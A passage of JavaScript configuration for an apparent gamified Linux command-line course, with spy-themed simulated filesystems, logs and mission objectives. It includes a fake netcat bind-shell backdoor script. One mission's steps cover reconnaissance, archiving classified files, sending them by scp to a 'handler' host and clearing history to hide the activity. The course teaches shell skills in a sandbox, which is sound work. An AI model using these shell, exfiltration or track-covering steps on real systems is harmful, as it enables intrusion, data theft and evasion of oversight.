                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
                    content: `CHIMERA HOLDINGS INC.
=====================
Founded: 2015
Industry: Defense Contracting
Headquarters: [CLASSIFIED]
Employees: 450+

Active Projects: 3 (see /data/projects/)
Archived Projects: 3 (see /data/archive/)

Public contact: info@chimeraholdings.example
`
                },
                '/data/public/org_chart.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `ORGANIZATION STRUCTURE
======================
CEO: [REDACTED]
CTO: [REDACTED]
CISO: [REDACTED]

Departments:
- Engineering (120)
- Security (45)
- Analysis (85)
- Operations (200)
`
                },

                // Backups - No access
                '/data/backups': {
                    type: 'dir', perms: 'drwx------', owner: 'backup', group: 'backup',
                    children: ['db_backup.sql.gz', 'files_backup.tar.gz']
                },

                // ═══════════════════════════════════════════════════════════
                // SYSTEM FILES
                // ═══════════════════════════════════════════════════════════
                '/etc/passwd': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 640,
                    content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ghost:x:1000:1000:Ghost Operator:/home/ghost:/bin/bash
admin:x:1001:1001:IT Administrator:/home/admin:/bin/bash
analyst:x:1002:1002:Data Analyst:/home/analyst:/bin/bash
svc_chimera:x:999:999:Chimera Service:/var/chimera:/usr/sbin/nologin
backup:x:998:998:Backup Service:/var/backups:/usr/sbin/nologin
`
                },
                '/etc/group': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
                    content: `root:x:0:
sudo:x:27:admin
users:x:100:ghost,analyst
projects:x:1000:ghost,analyst,admin
classified:x:1001:admin,ghost
`
                },
                '/etc/shadow': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'shadow', size: 256,
                    content: `[Permission denied - root access required]`
                },

                // ═══════════════════════════════════════════════════════════
                // LOGS - Important for investigation
                // ═══════════════════════════════════════════════════════════
                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['auth.log', 'syslog', 'secure', 'access.log', 'chimera_audit.log']
                },
                '/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
                    content: `Jan 15 02:30:00 CHIMERA sshd[8821]: Accepted publickey for ghost from 10.0.0.1 port 44123 ssh2
Jan 15 02:30:01 CHIMERA sshd[8821]: pam_unix(sshd:session): session opened for user ghost
Jan 15 02:40:15 CHIMERA audit[8890]: user ghost accessed /data/projects/hydra/
Jan 15 02:40:16 CHIMERA security: ALERT - Unauthorized access to monitored directory by ghost
Jan 15 02:55:00 CHIMERA sshd[8821]: pam_unix(sshd:session): session closed for user ghost
Jan 17 03:00:00 CHIMERA sshd[9234]: Accepted publickey for ghost from 10.0.0.1 port 55432 ssh2
Jan 17 03:00:01 CHIMERA sshd[9234]: pam_unix(sshd:session): session opened for user ghost
`
                },
                '/var/log/syslog': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
                    content: `Jan 17 00:00:00 CHIMERA systemd[1]: Starting Daily apt activities...
Jan 17 00:00:01 CHIMERA systemd[1]: Started Daily apt activities.
Jan 17 03:00:00 CHIMERA systemd[1]: Started Session 87 of user ghost.
Jan 17 03:00:01 CHIMERA systemd[1]: pam_unix(systemd-user:session): session opened for user ghost
`
                },
                '/var/log/secure': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root', size: 512,
                    content: `Jan 17 03:00:00 CHIMERA sshd[9234]: pam_unix(sshd:auth): authentication success; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.0.1 user=ghost
`
                },
                '/var/log/access.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 768,
                    content: `# Access log - CHIMERA workstation
10.0.0.1 - ghost [15/Jan/2026:02:30:00] "SSH LOGIN" 200 # WRAITH-7 session
10.0.0.1 - ghost [15/Jan/2026:02:40:15] "ACCESS /data/projects/hydra/" 200 # ALERT TRIGGERED
10.0.0.1 - ghost [15/Jan/2026:02:55:00] "SSH LOGOUT" 200 # Emergency extraction
10.0.0.1 - ghost [17/Jan/2026:03:00:00] "SSH LOGIN" 200 # Current session
`
                },
                '/var/log/chimera_audit.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
                    content: `CHIMERA SECURITY AUDIT LOG
==========================
2026-01-15 02:40:15 - ALERT: User 'ghost' accessed monitored directory /data/projects/hydra/
2026-01-15 02:40:16 - ACTION: Enhanced monitoring enabled for session
2026-01-15 02:45:00 - ALERT: Verification code HYDRA-3 submitted (DECOY CODE)
2026-01-15 02:45:01 - ACTION: Security review initiated
2026-01-15 02:55:00 - INFO: Session terminated by user
2026-01-16 09:00:00 - ACTION: Hydra directory placed under enhanced monitoring
2026-01-16 09:01:00 - ACTION: Cerberus honeypot refreshed
2026-01-17 03:00:00 - INFO: New session established for user 'ghost'
`
                },
            },

            // ═══════════════════════════════════════════════════════════
            // OBJECTIVES - 18 steps for 30+ minute challenge
            // ═══════════════════════════════════════════════════════════
            objectives: [
                // PHASE 1: RECONNAISSANCE (4 objectives)
                { id: 1, task: 'RECON: Establish your identity', hint: 'Who are you on this system?', check: (cmd, state, output) => cmd.includes('whoami') && output && output.includes('ghost') },
                { id: 2, task: 'RECON: Survey your environment', hint: 'What files and directories are in your home? Including hidden ones?', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-') && cmd.includes('a') && output && output.includes('.chimera_ops') },
                { id: 3, task: 'RECON: Discover previous operator intel', hint: 'Hidden directories often contain critical operational data. What did the previous operator leave behind?', check: (cmd, state, output) => output && output.includes('WRAITH-7') && (output.includes('MEDUSA') || output.includes('Medusa')) },
                { id: 4, task: 'RECON: Read your mission briefing', hint: 'The mission/ directory contains your operational parameters. What is your target?', check: (cmd, state, output) => output && output.includes('TOP SECRET') && output.includes('CHIMERA') && output.includes('MEDUSA') },

                // PHASE 2: ENUMERATION (3 objectives)
                { id: 5, task: 'ENUM: Identify system users', hint: 'Who has accounts on this system? Which file lists all users?', check: (cmd, state, output) => output && output.includes('ghost') && output.includes('admin') && output.includes('analyst') && output.includes('/bin/bash') },
                { id: 6, task: 'ENUM: Check group memberships', hint: 'What groups exist? Who has access to classified data?', check: (cmd, state, output) => output && output.includes('classified') && output.includes('projects') },
                { id: 7, task: 'ENUM: Map the network', hint: 'Where is the handler? Check your SSH configuration or known hosts.', check: (cmd, state, output) => output && output.includes('10.0.0.1') && (output.includes('handler') || output.includes('SPECTER')) },

                // PHASE 3: LOG ANALYSIS (2 objectives)
                { id: 8, task: 'LOGS: Review authentication history', hint: 'What happened on January 15th? Check the auth logs for WRAITH-7\'s session.', check: (cmd, state, output) => output && output.includes('ghost') && output.includes('hydra') && (output.includes('ALERT') || output.includes('Jan 15')) },
                { id: 9, task: 'LOGS: Understand the security incident', hint: 'The audit log shows what went wrong. What directory triggered the alert?', check: (cmd, state, output) => output && output.includes('HYDRA-3') && output.includes('DECOY') },

                // PHASE 4: TARGET IDENTIFICATION (3 objectives)
                { id: 10, task: 'TARGET: Explore the data directory structure', hint: 'What projects exist in /data/projects? List them WITHOUT accessing individual directories yet.', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('/data') && output && output.includes('medusa') && output.includes('hydra') && output.includes('cerberus') },
                { id: 11, task: 'TARGET: Identify the correct verification code', hint: 'The intel_brief.txt contains critical information. What is the VALID mission verification code (not a decoy)?', check: (cmd, state, output) => output && output.includes('MEDUSA-9') && output.includes('ONLY valid') },
                { id: 12, task: 'TARGET: Access the Medusa classified directory', hint: 'Navigate to the target: /data/projects/medusa/classified/ - What files are there?', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('medusa') && cmd.includes('classified') && output && output.includes('project_medusa.pdf') },

                // PHASE 5: DATA EXTRACTION (2 objectives)
                { id: 13, task: 'EXTRACT: Read the classified Medusa document', hint: 'The PDF contains the mission verification. Confirm the code matches what you found in intel_brief.txt.', check: (cmd, state, output) => output && output.includes('MEDUSA-9') && output.includes('TOP SECRET') && output.includes('MEDUSA') },
                { id: 14, task: 'EXTRACT: Verify target data location', hint: 'Confirm /data/projects/medusa/classified/ is your exfil target. Check staging/README.txt for the workflow.', check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('staging') && output && output.includes('handler') },

                // PHASE 6: EXFILTRATION (4 objectives)
                { id: 15, task: 'EXFIL: Package the intelligence', hint: 'Create a compressed archive of /data/projects/medusa/classified/ in your staging directory.', check: (cmd, state, output) => cmd.includes('tar') && cmd.includes('-c') && cmd.includes('medusa') && cmd.includes('classified') },
                { id: 16, task: 'EXFIL: Verify your package', hint: 'Confirm the package exists in staging/ before transfer.', check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('staging') && output && (output.includes('.tar') || output.includes('.gz')) },
                { id: 17, task: 'EXFIL: Transfer to handler', hint: 'Send the package to the handler at 10.0.0.1. Use SCP.', check: (cmd, state, output) => cmd.includes('scp') && (cmd.includes('10.0.0.1') || cmd.includes('handler')) && output && output.includes('100%') },
                { id: 18, task: 'CLEANUP: Cover your tracks', hint: 'Delete the package and clear your command history. Leave no trace.', check: (cmd, state, output) => (cmd.includes('rm') && cmd.includes('staging')) || (cmd.includes('history') && cmd.includes('-c')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the VALID mission verification code? (Hint: It's NOT Hydra or Phoenix)",
                hint: "The valid code is in mission/intel_brief.txt and confirmed in /data/projects/medusa/classified/",
                hintAfterAttempts: 2,
                acceptedAnswers: ['MEDUSA-9', 'medusa-9', 'Medusa-9'],
                correctAnswerMessage: 'Intel confirmed. Verification code MEDUSA-9 accepted — mission complete, ghost.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────────
        // CLH-031: OPERATION BLACKOUT (Final Exam)
        // Theme: Adversarial head-to-head vs SPECTER
        // ──────────────────────────────────────────────────────────────
        'CLH-031': {
            title: 'OPERATION BLACKOUT',
            description: 'Final exam. Race against hostile operator SPECTER to extract intel while countering active sabotage.',
            prerequisites: ['CLH-030'],
            tier: 'CLI Ghost',
            user: 'operator',
            hostname: 'RELAY',
            startDir: '/home/operator',
            allowedCommands: null,
            xpReward: 150,
            isCustomModule: true, // Uses custom game logic, not standard CLHTerminal

            // Note: This module has its own embedded game engine with:
            // - Real-time SPECTER AI opponent
            // - Network map visualization
            // - Patch panel puzzle (physical layer)
            // - Firewall configuration puzzle
            // - Dynamic objectives based on SPECTER actions
            // - Victory/defeat conditions based on progress race

            objectives: [
                { id: 1, task: 'Establish SSH to PROMETHEUS', hint: 'ssh operator@prometheus' },
                { id: 2, task: 'Locate classified intel files', hint: 'find /data -name "*.classified"' },
                { id: 3, task: 'Reroute via backup link (SPECTER destroys tower)', hint: 'Patch panel: A4 → B3' },
                { id: 4, task: 'Re-establish SSH connection', hint: 'ssh operator@prometheus' },
                { id: 5, task: 'Configure firewall (SPECTER blocks you)', hint: 'DENY 10.13.37.66, ALLOW 10.13.37.100' },
                { id: 6, task: 'Extract classified intel', hint: 'cat /data/ops/mission_intel.classified' },
                { id: 7, task: 'Exfiltrate and neutralize SPECTER', hint: 'scp + pkill -u specter' },
            ],

            insightPhase: {
                enabled: false, // Victory modal handles completion
            },

            filesystem: {
                // ══════════════════════════════════════════════════════════════
                // ROOT FILESYSTEM - OPERATION BLACKOUT
                // ══════════════════════════════════════════════════════════════

                '/': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['home', 'data', 'var', 'etc', 'tmp', 'opt', 'usr']
                },

                // ──────────────────────────────────────────────────────────────
                // HOME DIRECTORIES
                // ──────────────────────────────────────────────────────────────

                '/home': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['operator', 'specter', 'admin']
                },

                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.bashrc', '.ssh', 'Documents', 'Downloads', 'intel.classified', 'mission_notes.txt']
                },

                '/home/operator/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
                    content: `# .bashrc - operator terminal config
alias ll='ls -la'
alias cls='clear'
export PS1='\\u@\\h:\\w\\$ '`
                },

                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['known_hosts', 'id_rsa', 'id_rsa.pub']
                },

                '/home/operator/.ssh/known_hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
                    content: `prometheus,10.13.37.50 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...
relay,10.13.37.100 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...`
                },

                '/home/operator/.ssh/id_rsa': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator',
                    content: `-----BEGIN RSA PRIVATE KEY-----
[ENCRYPTED - PASSPHRASE REQUIRED]
-----END RSA PRIVATE KEY-----`
                },

                '/home/operator/.ssh/id_rsa.pub': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
                    content: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... operator@relay`
                },

                '/home/operator/Documents': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: []
                },

                '/home/operator/Downloads': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: []
                },

                '/home/operator/intel.classified': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator',
                    content: `═══════════════════════════════════════
TOP SECRET // OPERATION BLACKOUT
TARGET: SPECTER-7 - NEUTRALIZE
LOCATION: Node 7-ALPHA
STATUS: ACTIVE THREAT
═══════════════════════════════════════`
                },

                '/home/operator/mission_notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
                    content: `OPERATION BLACKOUT - Field Notes
================================
- Primary target: PROMETHEUS server
- Hostile: SPECTER (10.13.37.66)
- Objective: Extract intel before SPECTER
- Watch for traps and decoys
- Time is critical`
                },

                '/home/specter': {
                    type: 'dir', perms: 'drwx------', owner: 'specter', group: 'specter',
                    children: ['.hidden', 'plans.txt']
                },

                '/home/specter/.hidden': {
                    type: 'dir', perms: 'drwx------', owner: 'specter', group: 'specter',
                    children: ['backdoor.sh', 'exfil.py']
                },

                '/home/specter/.hidden/backdoor.sh': {
                    type: 'file', perms: '-rwx------', owner: 'specter', group: 'specter',
                    content: `#!/bin/bash
# SPECTER persistence mechanism
nc -lvp 4444 -e /bin/bash &`
                },

                '/home/specter/.hidden/exfil.py': {
                    type: 'file', perms: '-rwx------', owner: 'specter', group: 'specter',
                    content: `#!/usr/bin/env python3
# Data exfiltration tool
import socket, os
# [REDACTED]`
                },

                '/home/specter/plans.txt': {
                    type: 'file', perms: '-rw-------', owner: 'specter', group: 'specter',
                    content: `Phase 1: Infiltrate PROMETHEUS
Phase 2: Extract classified data
Phase 3: Cover tracks
Phase 4: Destroy evidence`
                },

                '/home/admin': {
                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
                    children: []
                },

                // ──────────────────────────────────────────────────────────────
                // DATA DIRECTORY - Mission Critical Intel
                // ──────────────────────────────────────────────────────────────

                '/data': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['ops', 'logs', 'backups']
                },

                '/data/ops': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'operator',
                    children: ['mission_intel.classified', 'targets.list', 'creds.enc']
                },

                '/data/ops/mission_intel.classified': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'operator',
                    content: `═══════════════════════════════════════
TOP SECRET // OPERATION BLACKOUT
═══════════════════════════════════════
TARGET: SPECTER-7 - NEUTRALIZE
LOCATION: Node 7-ALPHA
STATUS: ACTIVE THREAT

INTEL SUMMARY:
- SPECTER has compromised multiple nodes
- Origin IP: 10.13.37.66
- Method: SSH brute force + credential stuffing
- Current activity: Data exfiltration in progress

RECOMMENDED ACTION:
1. Terminate all SPECTER processes
2. Block origin IP at firewall
3. Rotate all credentials
4. Preserve logs for forensics
═══════════════════════════════════════`
                },

                '/data/ops/targets.list': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'operator',
                    content: `# Priority Targets - OPERATION BLACKOUT
10.13.37.50    PROMETHEUS    [PRIMARY]
10.13.37.51    ATLAS         [SECONDARY]
10.13.37.66    SPECTER       [HOSTILE]
10.13.37.100   RELAY         [FRIENDLY]`
                },

                '/data/ops/creds.enc': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'operator',
                    content: `[AES-256 ENCRYPTED]
U2FsdGVkX1+vupppZksvRf5pq...
[REQUIRES KEY FROM HANDLER]`
                },

                '/data/logs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['access.log', 'security.log']
                },

                '/data/logs/access.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `2024-01-31 08:14:22 operator LOGIN success from 10.13.37.100
2024-01-31 08:15:27 specter LOGIN success from 10.13.37.66
2024-01-31 08:16:45 specter ACCESS /data/ops/mission_intel.classified
2024-01-31 08:17:02 specter DOWNLOAD initiated`
                },

                '/data/logs/security.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `[ALERT] Multiple failed login attempts detected
[ALERT] Suspicious activity from 10.13.37.66
[ALERT] Unauthorized access attempt to /data/ops
[CRITICAL] Data exfiltration in progress`
                },

                '/data/backups': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'operator',
                    children: ['system.tar.gz', 'users.bak']
                },

                '/data/backups/system.tar.gz': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'operator',
                    content: `[BINARY DATA - COMPRESSED ARCHIVE]`
                },

                '/data/backups/users.bak': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'operator',
                    content: `root:x:0:0:root:/root:/bin/bash
operator:x:1000:1000::/home/operator:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash`
                },

                // ──────────────────────────────────────────────────────────────
                // VAR DIRECTORY - Logs
                // ──────────────────────────────────────────────────────────────

                '/var': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['log', 'run', 'tmp']
                },

                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['auth.log', 'syslog', 'messages', 'secure', 'daemon.log']
                },

                '/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
                    content: `Jan 31 08:15:22 prometheus sshd: Failed password for root from 10.13.37.66
Jan 31 08:15:24 prometheus sshd: Failed password for root from 10.13.37.66
Jan 31 08:15:27 prometheus sshd: Accepted password for specter from 10.13.37.66
Jan 31 08:16:01 prometheus sshd: Connection from 10.13.37.100 authorized
Jan 31 08:16:15 prometheus sshd: Accepted publickey for operator from 10.13.37.100
Jan 31 08:17:33 prometheus sudo: specter : TTY=pts/1 ; PWD=/data/ops ; COMMAND=/bin/cat mission_intel.classified`
                },

                '/var/log/syslog': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
                    content: `Jan 31 08:14:00 prometheus systemd: Started OpenSSH server daemon.
Jan 31 08:15:00 prometheus kernel: [UFW BLOCK] IN=eth0 SRC=10.13.37.66 DST=10.13.37.50 PROTO=TCP DPT=22
Jan 31 08:15:25 prometheus kernel: [UFW ALLOW] IN=eth0 SRC=10.13.37.66 DST=10.13.37.50 PROTO=TCP DPT=22
Jan 31 08:16:00 prometheus systemd: Session opened for user operator`
                },

                '/var/log/messages': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
                    content: `Jan 31 08:14:00 prometheus: System boot complete
Jan 31 08:15:30 prometheus: WARNING - Multiple authentication failures
Jan 31 08:16:00 prometheus: ALERT - Unusual process activity detected`
                },

                '/var/log/secure': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'root',
                    content: `Jan 31 08:15:22 prometheus sshd[1337]: Failed password for root
Jan 31 08:15:24 prometheus sshd[1337]: Failed password for root
Jan 31 08:15:27 prometheus sshd[1338]: Accepted password for specter
Jan 31 08:16:01 prometheus sshd[1339]: Accepted publickey for operator`
                },

                '/var/log/daemon.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm',
                    content: `Jan 31 08:14:00 prometheus sshd[1000]: Server listening on 0.0.0.0 port 22
Jan 31 08:14:00 prometheus cron[1001]: (CRON) INFO (Running @reboot jobs)`
                },

                '/var/run': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['sshd.pid', 'utmp']
                },

                '/var/run/sshd.pid': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `1000`
                },

                '/var/run/utmp': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `[BINARY - Active user sessions]`
                },

                '/var/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: []
                },

                // ──────────────────────────────────────────────────────────────
                // ETC DIRECTORY - System Configuration
                // ──────────────────────────────────────────────────────────────

                '/etc': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['passwd', 'shadow', 'hosts', 'hostname', 'network', 'ssh']
                },

                '/etc/passwd': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
operator:x:1000:1000::/home/operator:/bin/bash
specter:x:1001:1001::/home/specter:/bin/bash
admin:x:1002:1002::/home/admin:/bin/bash`
                },

                '/etc/shadow': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'shadow',
                    content: `root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
operator:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
specter:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
admin:$6$rounds=5000$salt$hash...:19000:0:99999:7:::`
                },

                '/etc/hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `127.0.0.1       localhost
10.13.37.50     prometheus
10.13.37.100    relay
10.13.37.66     specter-origin  # HOSTILE`
                },

                '/etc/hostname': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `RELAY`
                },

                '/etc/network': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['interfaces']
                },

                '/etc/network/interfaces': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 10.13.37.100
    netmask 255.255.255.0
    gateway 10.13.37.1`
                },

                '/etc/ssh': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['sshd_config', 'ssh_host_rsa_key.pub']
                },

                '/etc/ssh/sshd_config': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `# SSH Server Configuration
Port 22
PermitRootLogin no
PasswordAuthentication yes
PubkeyAuthentication yes
MaxAuthTries 3`
                },

                '/etc/ssh/ssh_host_rsa_key.pub': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
                    content: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... root@relay`
                },

                // ──────────────────────────────────────────────────────────────
                // OTHER DIRECTORIES
                // ──────────────────────────────────────────────────────────────

                '/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: []
                },

                '/opt': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: []
                },

                '/usr': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['bin', 'local']
                },

                '/usr/bin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: []
                },

                '/usr/local': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: []
                }
            },

            remoteHosts: {
                'prometheus': {
                    hostname: 'PROMETHEUS',
                    ip: '10.13.37.50',
                    user: 'operator',
                    filesystem: 'inherit' // Uses same filesystem structure
                }
            },
        },

        // ══════════════════════════════════════════════════════════════════════════
        // GREP & PIPE MASTERY - SPECIAL OPERATIONS COURSE
        // These modules are standalone (not part of CLH tier progression)
        // ══════════════════════════════════════════════════════════════════════════

        // ──────────────────────────────────────────────────────────
        // GPM-TRACE: BLACKSITE Grep Mission
        // Theme: Trace RAVEN, find Room 105
        // ──────────────────────────────────────────────────────────
        'GPM-TRACE': {
            title: 'TRACE',
            description: 'Use grep to trace operative RAVEN through Meridian Hotel logs.',
            prerequisites: [],
            tier: null, // Special course - not in tier progression
            user: 'analyst',
            hostname: 'logserver',
            startDir: '/var/log',
            allowedCommands: null,

            filesystem: {
                // ══════════════════════════════════════════════════════════
                // ANALYST HOME DIRECTORY - Orientation & Breadcrumbs
                // ══════════════════════════════════════════════════════════

                '/home': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['analyst']
                },

                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['.bashrc', '.bash_history', '.signal', 'BRIEFING.txt', 'notes', 'quickref.txt']
                },

                '/home/analyst/.signal': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst',
                    content: `[DEAD DROP - EYES ONLY]
═══════════════════════════════════════════════════

You found this. Good.

Standard channels are monitored.
When you need guidance, tune to 161.7

    > scan         - see available frequencies
    > tune 161.7   - connect to GHOST-7
    > tune ghost   - same thing

We've been where you are.
The answers are there if you listen.

    -W

[THIS FILE WILL SELF-DESTRUCT IN YOUR MIND]`
                },

                '/home/analyst/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `# BLACKSITE Analyst Terminal Configuration
# ═══════════════════════════════════════════════════════════

# Aliases for rapid navigation
alias mission='cd /var/log && ls -la'
alias blacksite='cd /blacksite && ls'
alias classified='cd /blacksite/classified && ls'
alias leaks='cd /blacksite/leaks && ls'
alias intercepts='cd /blacksite/intercepts && ls'
alias subjects='cd /blacksite/subjects && ls'
alias consortium='cd /blacksite/consortium && ls'

# Quick grep patterns
alias findcritical='grep -ri "CRITICAL\\|URGENT\\|PRIORITY" /var/log/'
alias findraven='grep -ri "RAVEN" /var/log/ /blacksite/'
alias findclassified='grep -ri "TOP SECRET\\|CLASSIFIED" /blacksite/'

# Reminder
echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║  BLACKSITE TERMINAL - Analyst Workstation                  ║"
echo "║  Type 'cat ~/BRIEFING.txt' for mission orientation         ║"
echo "║  Type 'mission' to jump to active operation files          ║"
echo "║  Type 'blacksite' to access the full database              ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""`
                },

                '/home/analyst/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst',
                    content: `cat ~/BRIEFING.txt
cd /var/log
ls -la
grep -i "raven" auth.log
grep -c "Failed" auth.log
cd /blacksite
ls
cat README.txt
cd classified
ls
cat PRISM-II.txt
cd /blacksite/consortium
cat structure.txt
cd /blacksite/intercepts/consortium-comms
cat meridian-planning.txt
grep -r "CRIMSON" /blacksite/
cd /var/log
grep -n "105" keycard.log
cat intel/threat_assessment.txt`
                },

                '/home/analyst/BRIEFING.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst',
                    content: `╔══════════════════════════════════════════════════════════════════╗
║                    ANALYST BRIEFING                              ║
║              CLASSIFICATION: EYES ONLY                           ║
╚══════════════════════════════════════════════════════════════════╝

Welcome to BLACKSITE, Analyst.

You have been granted Level 4 clearance - unrestricted read access
to the signals intelligence archive. This terminal contains
intercepted communications, leaked documents, and classified
assessments that do not officially exist.

════════════════════════════════════════════════════════════════════
CURRENT PRIORITY: OPERATION MERIDIAN DEFUSAL
════════════════════════════════════════════════════════════════════

SITUATION:
An IED has been planted at the Meridian Hotel by operative RAVEN,
a Consortium asset. The device is set to detonate during the CEO
Summit. Field agent PHOENIX is on site awaiting your analysis.

YOUR MISSION:
Use grep, regex, and command pipelines to analyze the intelligence
and provide PHOENIX with the defusal sequence before time expires.

MISSION FILES LOCATION:
  /var/log/           <- START HERE (hotel security logs)
  /var/log/intel/     <- Threat assessments and dossiers

════════════════════════════════════════════════════════════════════
THE BIGGER PICTURE
════════════════════════════════════════════════════════════════════

The Meridian attack is one thread in a larger web. The Consortium
has been operating for decades. This database contains everything
we've compiled on their operations.

EXPLORE WHEN TIME PERMITS:
  /blacksite/classified/    <- Surveillance programs
  /blacksite/leaks/         <- Whistleblower documents
  /blacksite/intercepts/    <- Signals intelligence
  /blacksite/subjects/      <- Person dossiers
  /blacksite/operations/    <- Historical ops
  /blacksite/archives/      <- Cold cases
  /blacksite/consortium/    <- The shadow network itself

════════════════════════════════════════════════════════════════════
QUICK COMMANDS
════════════════════════════════════════════════════════════════════

  mission     - Jump to active operation files (/var/log)
  blacksite   - Access the full intelligence database
  help        - Show available commands
  man <cmd>   - Manual for specific command (e.g., man grep)
  scan        - Check radio frequencies (unofficial)

════════════════════════════════════════════════════════════════════
UNOFFICIAL ADDENDUM
════════════════════════════════════════════════════════════════════

Some analysts report finding hidden files (ls -a) in their
